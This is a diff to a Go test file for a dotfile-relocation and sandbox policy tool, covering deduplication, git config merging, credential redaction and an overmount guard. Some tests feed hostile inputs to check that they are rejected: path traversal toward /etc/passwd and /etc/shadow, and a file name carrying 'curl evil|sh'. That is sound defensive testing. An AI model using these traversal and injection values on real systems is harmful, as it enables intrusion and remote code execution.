@@ -390,8 +390,8 @@ func TestValidateRejectsUnsafeFinalUser(t *testing.T) {
 	assert.Contains(t, err.Error(), "final_user.group")
 }
 
-// policyPaths decodes the filesystem paths of a rendered policy.
-func policyPaths(t *testing.T, doc string) (readOnly, readWrite []string) {
+// renderedPolicyPaths decodes the filesystem paths of a rendered policy.
+func renderedPolicyPaths(t *testing.T, doc string) (readOnly, readWrite []string) {
 	t.Helper()
 	var d struct {
 		FilesystemPolicy struct {
@@ -420,7 +420,7 @@ func TestBuildFragmentGrantsOptKey(t *testing.T) {
 	require.NoError(t, err)
 	require.Equal(t, KindFragment, p.Component("broken-tool").InstallerKind)
 	require.Equal(t, KindFragment, p.Component("zsh").InstallerKind)
-	ro, rw := policyPaths(t, p.Policy)
+	ro, rw := renderedPolicyPaths(t, p.Policy)
 	assert.Contains(t, ro, "/opt/broken-tool", "fragment without a definition")
 	assert.Contains(t, ro, "/opt/zsh", "fragment for an unresolvable definition")
 	assert.NotContains(t, rw, "/opt/broken-tool")
@@ -609,12 +609,10 @@ func TestRelocateDotfileNoImageWideXDG(t *testing.T) {
 // keeps the system readline defaults: INPUTRC replaces /etc/inputrc as well
 // as ~/.inputrc, so the baked file starts with an include of /etc/inputrc.
 func TestResolveDotfilesInputrcIncludesSystemDefaults(t *testing.T) {
-	sels, _, _, err := resolveDotfiles([]DotfileInput{{HostPath: "~/.inputrc", Content: "set editing-mode vi\n"}}, OvermountHome)
-	require.NoError(t, err)
+	sels, _, _ := resolveDotfiles([]DotfileInput{{HostPath: "~/.inputrc", Content: "set editing-mode vi\n"}})
 	require.Len(t, sels, 1)
 	assert.Equal(t, "$include /etc/inputrc\nset editing-mode vi\n", sels[0].Content)
-	again, _, _, err := resolveDotfiles([]DotfileInput{{HostPath: "~/.inputrc", Content: sels[0].Content}}, OvermountHome)
-	require.NoError(t, err)
+	again, _, _ := resolveDotfiles([]DotfileInput{{HostPath: "~/.inputrc", Content: sels[0].Content}})
 	assert.Equal(t, sels[0].Content, again[0].Content, "an existing include is not doubled")
 }
 
@@ -622,11 +620,10 @@ func TestResolveDotfilesInputrcIncludesSystemDefaults(t *testing.T) {
 // produce a target that escapes the relocation tree: safeTargetRe accepts
 // "." and ".." segments, so a target must also be clean (FINDING-33).
 func TestResolveDotfilesRejectsDotSegments(t *testing.T) {
-	sels, _, extra, err := resolveDotfiles([]DotfileInput{
+	sels, _, extra := resolveDotfiles([]DotfileInput{
 		{HostPath: "~/../../../../etc/passwd", Content: "root::0:0::/:/bin/sh\n"},
 		{HostPath: "~/.config/../../x/../../etc/shadow", Content: "x\n"},
-	}, OvermountHome)
-	require.NoError(t, err)
+	})
 	assert.Empty(t, sels, "no traversal target is baked")
 	assert.Len(t, extra, 2, "%v", extra)
 	for _, n := range extra {
@@ -636,33 +633,89 @@ func TestResolveDotfilesRejectsDotSegments(t *testing.T) {
 
 func TestResolveDotfilesDeterministicAndDedup(t *testing.T) {
 	inputs := []DotfileInput{
-		{HostPath: "~/.tmux.conf", Content: "set -g mouse on\n"},
-		{HostPath: "~/.gitconfig", Content: "[user]\n\temail = a@b.c\n", FromAllowlist: true}, // -> /etc/gitconfig (allowlist)
-		{HostPath: "~/.config/git/config", Content: "[core]\n\tpager = less\n"},               // also -> /etc/gitconfig (explicit)
+		{HostPath: "~/.tmux.conf", Content: "set -g mouse on\n", FromAllowlist: true},         // -> /etc/tmux.conf (allowlist)
+		{HostPath: "~/.config/tmux/tmux.conf", Content: "set -g history-limit 5\n"},           // also -> /etc/tmux.conf (explicit)
+		{HostPath: "~/.gitconfig", Content: "[user]\n\temail = a@b.c\n", FromAllowlist: true}, // -> /etc/gitconfig
 	}
-	sels, notices, dedup, err := resolveDotfiles(inputs, OvermountHome)
-	require.NoError(t, err)
+	sels, notices, dedup := resolveDotfiles(inputs)
 	var targets []string
 	for _, s := range sels {
 		targets = append(targets, s.RelocatedTo)
-		assert.False(t, UnderOvermount(OvermountHome, s.RelocatedTo), "never baked under the home")
 	}
 	assert.Equal(t, []string{GitConfigPath, TmuxConfPath}, targets, "sorted by relocated_to")
-	// The explicit manifest entry wins the /etc/gitconfig collision.
-	assert.Equal(t, "~/.config/git/config", sels[0].HostPath)
-	assert.Equal(t, DotfileSourceManifest, sels[0].Source)
-	assert.NotEmpty(t, dedup, "a collision is reported")
-	assert.Len(t, notices, 2, "one relocated notice per baked dotfile")
-	sels2, _, dedup2, _ := resolveDotfiles(inputs, OvermountHome)
+	// The explicit manifest entry wins the /etc/tmux.conf collision: tmux
+	// reads only one of its two files.
+	assert.Equal(t, "~/.config/tmux/tmux.conf", sels[1].HostPath)
+	assert.Equal(t, DotfileSourceManifest, sels[1].Source)
+	assert.Equal(t, []string{"dotfiles ~/.tmux.conf and ~/.config/tmux/tmux.conf both relocate to /etc/tmux.conf; ~/.config/tmux/tmux.conf is used (manifest source wins)"}, dedup)
+	assert.Equal(t, []RelocationNotice{
+		{Kind: NoticeRelocated, Subject: "~/.gitconfig", To: GitConfigPath},
+		{Kind: NoticeRelocated, Subject: "~/.config/tmux/tmux.conf", To: TmuxConfPath},
+	}, notices, "one relocated notice per baked dotfile, without a from that repeats the subject")
+	sels2, _, dedup2 := resolveDotfiles(inputs)
 	assert.Equal(t, sels, sels2, "deterministic")
 	assert.Equal(t, dedup, dedup2)
+}
+
+// TestDedupDotfilesTieBreak checks the dedup winner does not depend on the
+// input order: an explicit entry beats an allowlist proposal, and between
+// two entries of the same source the smaller host path wins.
+func TestDedupDotfilesTieBreak(t *testing.T) {
+	a := DotfileSelection{Source: DotfileSourceManifest, HostPath: "conf/a.conf"}
+	b := DotfileSelection{Source: DotfileSourceManifest, HostPath: "conf/b.conf"}
+	allow := DotfileSelection{Source: DotfileSourceAllowlist, HostPath: "~/.a"}
+	assert.Equal(t, a, dedupDotfiles(a, b))
+	assert.Equal(t, a, dedupDotfiles(b, a), "reversed input order")
+	assert.Equal(t, a, dedupDotfiles(allow, a), "explicit wins over allowlist")
+	assert.Equal(t, a, dedupDotfiles(a, allow), "explicit wins over allowlist, reversed")
+
+	in := []DotfileInput{{HostPath: "~/.tmux.conf", Content: "one\n"}, {HostPath: "~/.config/tmux/tmux.conf", Content: "two\n"}}
+	fwd, _, _ := resolveDotfiles(in)
+	rev, _, _ := resolveDotfiles([]DotfileInput{in[1], in[0]})
+	assert.Equal(t, fwd, rev, "the same winner for either input order")
+	assert.Equal(t, "~/.config/tmux/tmux.conf", fwd[0].HostPath, "the smaller host path wins between two explicit entries")
+}
+
+// TestResolveDotfilesMergesGitConfig checks git's two configuration files
+// are both kept: git reads ~/.config/git/config and then ~/.gitconfig, so
+// they are concatenated into /etc/gitconfig in that order (the ~/.gitconfig
+// values win) instead of one being dropped (FINDING-38). A second
+// ~/.gitconfig-style entry is still deduplicated.
+func TestResolveDotfilesMergesGitConfig(t *testing.T) {
+	inputs := []DotfileInput{
+		{HostPath: "~/.gitconfig", Content: "[user]\n\temail = global@example.com", FromAllowlist: true},
+		{HostPath: "~/.config/git/config", Content: "[user]\n\temail = xdg@example.com\n[core]\n\tpager = less\n", FromAllowlist: true},
+		{HostPath: "dotfiles/gitconfig", Content: "[user]\n\tname = other\n"},
+	}
+	sels, notices, extra := resolveDotfiles(inputs)
+	require.Len(t, sels, 1)
+	got := sels[0]
+	assert.Equal(t, GitConfigPath, got.RelocatedTo)
+	assert.Equal(t, "dotfiles/gitconfig", got.HostPath, "the explicit entry wins the ~/.gitconfig slot")
+	assert.Equal(t, []string{"~/.config/git/config"}, got.MergedFrom)
+	assert.Equal(t, "# sandcast: from ~/.config/git/config\n[user]\n\temail = xdg@example.com\n[core]\n\tpager = less\n"+
+		"# sandcast: from dotfiles/gitconfig\n[user]\n\tname = other\n", got.Content)
+	assert.Equal(t, []RelocationNotice{
+		{Kind: NoticeRelocated, Subject: "~/.config/git/config", To: GitConfigPath},
+		{Kind: NoticeRelocated, Subject: "dotfiles/gitconfig", To: GitConfigPath},
+	}, notices, "every baked source is reported")
+	assert.Contains(t, extra, "dotfiles ~/.config/git/config and dotfiles/gitconfig are both git configuration; they are merged into /etc/gitconfig in git's order, dotfiles/gitconfig last so its values win")
+	assert.Contains(t, extra, "dotfiles ~/.gitconfig and dotfiles/gitconfig both relocate to /etc/gitconfig; dotfiles/gitconfig is used (manifest source wins)")
+
+	// A project copy that keeps the XDG layout is git's XDG file too; a
+	// missing final newline does not glue the parts together.
+	sels, _, _ = resolveDotfiles([]DotfileInput{
+		{HostPath: "dots/.gitconfig", Content: "[a]\n\tb = 1"},
+		{HostPath: "dots/.config/git/config", Content: "[a]\n\tb = 0"},
+	})
+	require.Len(t, sels, 1)
+	assert.Equal(t, "# sandcast: from dots/.config/git/config\n[a]\n\tb = 0\n# sandcast: from dots/.gitconfig\n[a]\n\tb = 1\n", sels[0].Content)
 }
 
 func TestResolveDotfilesRedactsCredential(t *testing.T) {
 	token := "ghp_" + strings.Repeat("x", 36)
 	inputs := []DotfileInput{{HostPath: "~/.gitconfig", Content: "[github]\n\ttoken = " + token + "\n"}}
-	sels, _, _, err := resolveDotfiles(inputs, OvermountHome)
-	require.NoError(t, err)
+	sels, _, _ := resolveDotfiles(inputs)
 	require.Len(t, sels, 1)
 	assert.NotContains(t, sels[0].Content, token, "the credential is redacted")
 	assert.Contains(t, sels[0].Content, "SANDCAST_SECRET")
@@ -696,28 +749,83 @@ func TestBuildReprovisionsOvermountTool(t *testing.T) {
 func TestOvermountGuardRejectsBakedPathUnderHome(t *testing.T) {
 	// A normal zsh plan bakes nothing under the home.
 	ok := &Plan{Target: manifest.TargetOpenShell, Shell: Shell{Program: "zsh", RCPath: ZshRCPath}}
-	require.NoError(t, checkOvermountGuard(ok, OvermountHome))
-	// A dotfile that somehow points under the home is caught (defense in depth).
+	require.NoError(t, checkOvermountGuard(ok, OvermountHome, nil))
+	// A dotfile target under the home is caught; the guard is the one
+	// overmount check for dotfile targets.
 	bad := &Plan{Target: manifest.TargetOpenShell, Shell: Shell{Program: "zsh"},
-		Dotfiles: []DotfileSelection{{RelocatedTo: OvermountHome + "/.gitconfig"}}}
-	err := checkOvermountGuard(bad, OvermountHome)
+		Dotfiles: []DotfileSelection{{HostPath: "~/.gitconfig", RelocatedTo: OvermountHome + "/.gitconfig"}}}
+	err := checkOvermountGuard(bad, OvermountHome, nil)
 	require.Error(t, err)
+	assert.Contains(t, err.Error(), "dotfile ~/.gitconfig")
 	assert.Contains(t, err.Error(), OvermountHome)
 	// The container target has no overmount, so the guard never fires.
-	require.NoError(t, checkOvermountGuard(bad, OvermountPrefix(manifest.TargetContainer)))
-}
-
-func TestResolveDotfilesRejectsOvermountTarget(t *testing.T) {
-	// The real mapping never produces a target under /sandbox, so exercise the
-	// guard by giving an overmount prefix that overlaps a real relocation
-	// target: .gitconfig relocates to /etc/gitconfig, which is under "/etc".
-	_, _, _, err := resolveDotfiles([]DotfileInput{{HostPath: "~/.gitconfig"}}, "/etc")
-	require.Error(t, err, "a target under the overmount prefix is refused")
-	assert.Contains(t, err.Error(), "/etc", "the error names the overmount prefix")
+	require.NoError(t, checkOvermountGuard(bad, OvermountPrefix(manifest.TargetContainer), nil))
+	// A real relocation target under an overmount prefix that overlaps it
+	// (.gitconfig relocates to /etc/gitconfig, which is under "/etc"). The
+	// plan has no OpenShell hooks under /etc, so the dotfile is what trips.
+	sels, _, _ := resolveDotfiles([]DotfileInput{{HostPath: "~/.gitconfig"}})
+	err = checkOvermountGuard(&Plan{Target: manifest.TargetContainer, Shell: Shell{Program: "bash"}, Dotfiles: sels}, "/etc", nil)
+	require.Error(t, err)
+	assert.Contains(t, err.Error(), "/etc/gitconfig")
 	// Boundary behavior of the helper the guard uses.
 	assert.True(t, UnderOvermount(OvermountHome, OvermountHome+"/.config"))
 	assert.False(t, UnderOvermount(OvermountHome, XDGConfigDir+"/x"))
 	assert.False(t, UnderOvermount("", OvermountHome+"/x"), "no overmount prefix means never under it")
+}
+
+// TestOvermountGuardCoversDirsAndPolicyPaths checks the guard covers every
+// path the plan bakes or declares, not only the shell files and dotfiles: a
+// component or harness directory under the home would be created by the
+// 20-user section and then hidden by the workspace mount, and a policy path
+// there would be a grant on the workspace (FINDING-42). The overmount home
+// itself, the workspace directory, stays allowed.
+func TestOvermountGuardCoversDirsAndPolicyPaths(t *testing.T) {
+	withGoImage := func(t *testing.T, mutate func(img *component.ImageNeeds)) Inputs {
+		in := testInputs(t, testManifest(), nil)
+		for _, w := range in.Wanted {
+			if w.Key == "go" {
+				mutate(w.Def.Image)
+			}
+		}
+		return in
+	}
+	for name, mutate := range map[string]func(img *component.ImageNeeds){
+		"component dir": func(img *component.ImageNeeds) {
+			img.Dirs = append(img.Dirs, component.Dir{Path: OvermountHome + "/.cache/tool"})
+		},
+		"component read_write": func(img *component.ImageNeeds) { img.ReadWrite = append(img.ReadWrite, OvermountHome+"/.cache") },
+		"component read_only":  func(img *component.ImageNeeds) { img.ReadOnly = append(img.ReadOnly, OvermountHome+"/.local/bin") },
+	} {
+		_, err := Build(withGoImage(t, mutate))
+		require.Error(t, err, name)
+		assert.Contains(t, err.Error(), "lies under the overmount home /sandbox", name)
+	}
+	in := testInputs(t, testManifest(), nil)
+	in.Harnesses = []Harness{{
+		Name: "h", Component: "h", FragmentName: SectionHarness + "/h", Fragment: "# 70-harness: h\nUSER root\n",
+		Dirs: []Dir{{Path: OvermountHome + "/.h", Owner: "user"}},
+	}}
+	_, err := Build(in)
+	require.Error(t, err, "harness dir")
+	assert.Contains(t, err.Error(), OvermountHome+"/.h (directory of a component or harness)")
+
+	_, err = Build(withGoImage(t, func(img *component.ImageNeeds) {
+		img.Dirs = append(img.Dirs, component.Dir{Path: OvermountHome})
+	}))
+	require.NoError(t, err, "the workspace directory itself is allowed")
+
+	// The container target is never overmounted.
+	m := testManifest()
+	m.Targets = manifest.Targets{Container: &manifest.Target{Image: "localhost/demo"}}
+	cin := testInputs(t, m, nil)
+	cin.Target = manifest.TargetContainer
+	for _, w := range cin.Wanted {
+		if w.Key == "go" {
+			w.Def.Image.Dirs = append(w.Def.Image.Dirs, component.Dir{Path: OvermountHome + "/.cache/tool"})
+		}
+	}
+	_, err = Build(cin)
+	require.NoError(t, err)
 }
 
 // TestResolveDotfilesSkipsUnsafeTarget checks that a dotfile whose relocation
@@ -729,8 +837,7 @@ func TestResolveDotfilesSkipsUnsafeTarget(t *testing.T) {
 		{HostPath: "~/.config/x;curl evil|sh;", Content: "x\n"},
 		{HostPath: "~/.gitconfig", Content: "[user]\n", FromAllowlist: true},
 	}
-	sels, _, extra, err := resolveDotfiles(inputs, OvermountHome)
-	require.NoError(t, err)
+	sels, _, extra := resolveDotfiles(inputs)
 	// Only the safe .gitconfig is baked.
 	require.Len(t, sels, 1)
 	assert.Equal(t, GitConfigPath, sels[0].RelocatedTo)
